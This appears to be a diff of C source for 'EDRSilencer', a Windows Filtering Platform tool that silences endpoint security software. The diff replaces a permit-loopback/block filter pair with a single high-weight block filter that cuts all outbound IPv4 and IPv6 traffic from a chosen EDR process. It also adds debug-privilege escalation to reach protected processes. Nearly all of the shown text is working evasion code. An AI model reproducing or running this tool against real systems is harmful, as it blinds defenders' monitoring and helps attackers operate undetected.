@@ -13,138 +13,61 @@
 // Globally unique identifiers (GUIDs) for our WFP provider and sublayer
 const GUID ProviderGUID = { 0x4e27e7d4, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
 const GUID SubLayerGUID = { 0x4e27e7d5, 0x2442, 0x4891, { 0x91, 0x2e, 0x42, 0x5, 0x42, 0x8a, 0x85, 0x55 } };
-const wchar_t* ruleDescription = L"Blocks outbound connections for a specific EDR process";
+wchar_t ruleDescription[] = L"Blocks outbound connections for a specific EDR process";
 
 
 
 
-// Helper function to apply the two-layer permit/block filter system for a given AppID
+// Helper function to apply a simple, effective block filter for a given AppID.
 void applyStealthFilters(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
     FWP_BYTE_BLOB* appId = NULL;
     DWORD result = 0;
     UINT64 filterId = 0;
 
-    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != 0) {
-        wprintf(L"[-] Failed to get AppID for %s\n", fullPath);
+    // Attempt to get the Application ID from the full path.
+    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) {
+        wprintf(L"    [-] Failed to get AppID for %s\n", fullPath);
         return;
     }
 
-    // --- Permit Loopback Filter for IPv4 ---
-    FWPM_FILTER0 permitFilterV4 = {0};
-    permitFilterV4.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
-    permitFilterV4.action.type = FWP_ACTION_PERMIT;
-    permitFilterV4.subLayerKey = *subLayerGuid;
-    permitFilterV4.weight.type = FWP_UINT8;
-    permitFilterV4.weight.uint8 = 14; // Lower weight than the block filter
-    permitFilterV4.numFilterConditions = 2;
-    permitFilterV4.displayData.name = L"Permit Loopback IPv4 for EDR";
-    permitFilterV4.displayData.description = L"Permits EDR process loopback traffic.";
+    // --- Create a generic BLOCK filter structure ---
+    FWPM_FILTER0 blockFilter = {0};
+    blockFilter.subLayerKey = *subLayerGuid;
+    blockFilter.action.type = FWP_ACTION_BLOCK; // The action is to BLOCK
+    blockFilter.weight.type = FWP_UINT8;
+    blockFilter.weight.uint8 = 15; // High weight to ensure it takes precedence
+    blockFilter.numFilterConditions = 1;
+    blockFilter.displayData.name = L"EDRSilencer Block Rule";
+    blockFilter.displayData.description = ruleDescription;
 
-    FWPM_FILTER_CONDITION0 conditionsV4[2] = {0};
-    conditionsV4[0].fieldKey = FWPM_CONDITION_ALE_APP_ID;
-    conditionsV4[0].matchType = FWP_MATCH_EQUAL;
-    conditionsV4[0].conditionValue.type = FWP_BYTE_BLOB_TYPE;
-    conditionsV4[0].conditionValue.byteBlob = appId;
+    // Define the single condition: match the Application ID
+    FWPM_FILTER_CONDITION0 blockCondition = {0};
+    blockCondition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
+    blockCondition.matchType = FWP_MATCH_EQUAL;
+    blockCondition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
+    blockCondition.conditionValue.byteBlob = appId;
+    blockFilter.filterCondition = &blockCondition;
 
-    conditionsV4[1].fieldKey = FWPM_CONDITION_IP_REMOTE_ADDRESS;
-    conditionsV4[1].matchType = FWP_MATCH_EQUAL;
-    conditionsV4[1].conditionValue.type = FWP_UINT32;
-    conditionsV4[1].conditionValue.uint32 = 0x7F000001; // 127.0.0.1
-
-    permitFilterV4.filterCondition = conditionsV4;
-
-    result = FwpmFilterAdd0(hEngine, &permitFilterV4, NULL, &filterId);
+    // --- Add the filter for IPv4 ---
+    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
+    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
     if (result != ERROR_SUCCESS) {
-        wprintf(L"[-] Failed to add IPv4 permit filter for %s. Error: %d\n", fullPath, result);
+        wprintf(L"    [-] Failed to add IPv4 block filter for %s. Error: 0x%lX\n", fullPath, result);
     } else {
-        wprintf(L"[+] IPv4 permit filter added for %s with ID %llu.\n", fullPath, filterId);
+        wprintf(L"    [+] Block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId);
     }
 
-    // --- Block All Filter for IPv4 ---
-    FWPM_FILTER0 blockFilterV4 = {0};
-    blockFilterV4.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
-    blockFilterV4.action.type = FWP_ACTION_BLOCK;
-    blockFilterV4.subLayerKey = *subLayerGuid;
-    blockFilterV4.weight.type = FWP_UINT8;
-    blockFilterV4.weight.uint8 = 15; // Higher weight
-    blockFilterV4.numFilterConditions = 1;
-    blockFilterV4.displayData.name = L"Block Outbound IPv4 for EDR";
-    blockFilterV4.displayData.description = L"Blocks all outbound traffic for a specific EDR process.";
-
-    FWPM_FILTER_CONDITION0 blockConditionV4 = {0};
-    blockConditionV4.fieldKey = FWPM_CONDITION_ALE_APP_ID;
-    blockConditionV4.matchType = FWP_MATCH_EQUAL;
-    blockConditionV4.conditionValue.type = FWP_BYTE_BLOB_TYPE;
-    blockConditionV4.conditionValue.byteBlob = appId;
-    blockFilterV4.filterCondition = &blockConditionV4;
-
-    result = FwpmFilterAdd0(hEngine, &blockFilterV4, NULL, &filterId);
+    // --- Add the same filter for IPv6 ---
+    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
+    filterId = 0; // Reset for the next call
+    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
     if (result != ERROR_SUCCESS) {
-        wprintf(L"[-] Failed to add IPv4 block filter for %s. Error: %d\n", fullPath, result);
+        wprintf(L"    [-] Failed to add IPv6 block filter for %s. Error: 0x%lX\n", fullPath, result);
     } else {
-        wprintf(L"[+] IPv4 block filter added for %s with ID %llu.\n", fullPath, filterId);
+        wprintf(L"    [+] Block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId);
     }
 
-    // --- Permit Loopback Filter for IPv6 ---
-    FWPM_FILTER0 permitFilterV6 = {0};
-    permitFilterV6.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
-    permitFilterV6.action.type = FWP_ACTION_PERMIT;
-    permitFilterV6.subLayerKey = *subLayerGuid;
-    permitFilterV6.weight.type = FWP_UINT8;
-    permitFilterV6.weight.uint8 = 14;
-    permitFilterV6.numFilterConditions = 2;
-    permitFilterV6.displayData.name = L"Permit Loopback IPv6 for EDR";
-    permitFilterV6.displayData.description = L"Permits EDR process loopback traffic.";
-
-    FWP_BYTE_ARRAY16 ipv6LoopbackAddr;
-    memset(&ipv6LoopbackAddr, 0, sizeof(ipv6LoopbackAddr));
-    ipv6LoopbackAddr.byteArray16[15] = 1; // Represents ::1
-
-    FWPM_FILTER_CONDITION0 conditionsV6[2] = {0};
-    conditionsV6[0].fieldKey = FWPM_CONDITION_ALE_APP_ID;
-    conditionsV6[0].matchType = FWP_MATCH_EQUAL;
-    conditionsV6[0].conditionValue.type = FWP_BYTE_BLOB_TYPE;
-    conditionsV6[0].conditionValue.byteBlob = appId;
-
-    conditionsV6[1].fieldKey = FWPM_CONDITION_IP_REMOTE_ADDRESS;
-    conditionsV6[1].matchType = FWP_MATCH_EQUAL;
-    conditionsV6[1].conditionValue.type = FWP_BYTE_ARRAY16_TYPE;
-    conditionsV6[1].conditionValue.byteArray16 = &ipv6LoopbackAddr;
-
-    permitFilterV6.filterCondition = conditionsV6;
-
-    result = FwpmFilterAdd0(hEngine, &permitFilterV6, NULL, &filterId);
-    if (result != ERROR_SUCCESS) {
-        wprintf(L"[-] Failed to add IPv6 permit filter for %s. Error: %d\n", fullPath, result);
-    } else {
-        wprintf(L"[+] IPv6 permit filter added for %s with ID %llu.\n", fullPath, filterId);
-    }
-
-    // --- Block All Filter for IPv6 ---
-    FWPM_FILTER0 blockFilterV6 = {0};
-    blockFilterV6.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
-    blockFilterV6.action.type = FWP_ACTION_BLOCK;
-    blockFilterV6.subLayerKey = *subLayerGuid;
-    blockFilterV6.weight.type = FWP_UINT8;
-    blockFilterV6.weight.uint8 = 15;
-    blockFilterV6.numFilterConditions = 1;
-    blockFilterV6.displayData.name = L"Block Outbound IPv6 for EDR";
-    blockFilterV6.displayData.description = L"Blocks all outbound traffic for a specific EDR process.";
-
-    FWPM_FILTER_CONDITION0 blockConditionV6 = {0};
-    blockConditionV6.fieldKey = FWPM_CONDITION_ALE_APP_ID;
-    blockConditionV6.matchType = FWP_MATCH_EQUAL;
-    blockConditionV6.conditionValue.type = FWP_BYTE_BLOB_TYPE;
-    blockConditionV6.conditionValue.byteBlob = appId;
-    blockFilterV6.filterCondition = &blockConditionV6;
-
-    result = FwpmFilterAdd0(hEngine, &blockFilterV6, NULL, &filterId);
-    if (result != ERROR_SUCCESS) {
-        wprintf(L"[-] Failed to add IPv6 block filter for %s. Error: %d\n", fullPath, result);
-    } else {
-        wprintf(L"[+] IPv6 block filter added for %s with ID %llu.\n", fullPath, filterId);
-    }
-
+    // Clean up the AppID we created
     FreeAppId(appId);
 }
 
@@ -192,6 +115,7 @@ void shutdownWfp(HANDLE hEngine) {
 }
 
 void addProcessRule(const char* processPath) {
+    EnableSeDebugPrivilege(); // Required to get handles to protected processes
     HANDLE hEngine = NULL;
     if (!initializeWfp(&hEngine)) {
         return;
@@ -208,6 +132,7 @@ void addProcessRule(const char* processPath) {
 
 // Function to configure network filters
 void configureNetworkFilters() {
+    EnableSeDebugPrivilege(); // Required to get handles to protected processes
     HANDLE hEngine = NULL;
     if (!initializeWfp(&hEngine)) {
         return;
